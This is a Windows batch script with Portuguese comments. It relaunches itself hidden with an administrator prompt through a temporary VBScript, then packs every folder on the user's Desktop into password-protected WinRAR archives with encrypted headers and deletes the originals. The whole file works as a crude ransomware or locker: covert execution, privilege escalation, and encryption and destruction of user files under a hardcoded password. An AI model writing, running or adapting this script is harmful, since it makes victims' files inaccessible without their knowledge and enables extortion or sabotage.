@echo off
chcp 65001 > nul

:: Verifica se já está em modo oculto
if not "%1"=="hidden" (
    :: Usa VBScript para executar totalmente oculto
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\hidden.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~f0"" hidden", "", "runas", 0 >> "%temp%\hidden.vbs"
    cscript //nologo "%temp%\hidden.vbs"
    del "%temp%\hidden.vbs"
    exit
)

:: Configurações
set "senha=DefaultPassword123"
set "winrar_path="

:: Localiza o WinRAR
for %%i in (
  "%ProgramFiles%\WinRAR\WinRAR.exe"
  "%ProgramFiles(x86)%\WinRAR\WinRAR.exe"
  "%ProgramW6432%\WinRAR\WinRAR.exe"
) do if exist "%%~i" set "winrar_path=%%~i"

if not defined winrar_path exit /b 1

:: Processo de compactação com exclusão automática
cd /d "%USERPROFILE%\Desktop"
set "contador=0"

for /d %%d in (*) do (
  echo Compactando e removendo original: %%~nxd
  "%winrar_path%" a -r -ep1 -hp"%senha%" -m3 -md64m -mmt=on -idq -ol -ibck -df "%%~nxd.rar" "%%~d" >nul 2>&1
  
  if exist "%%~nxd.rar" (
    set /a "contador+=1"
    :: Verificação adicional para garantir que a pasta foi removida
    if exist "%%~d" (
      rd /s /q "%%~d" >nul 2>&1
    )
  )
)

exit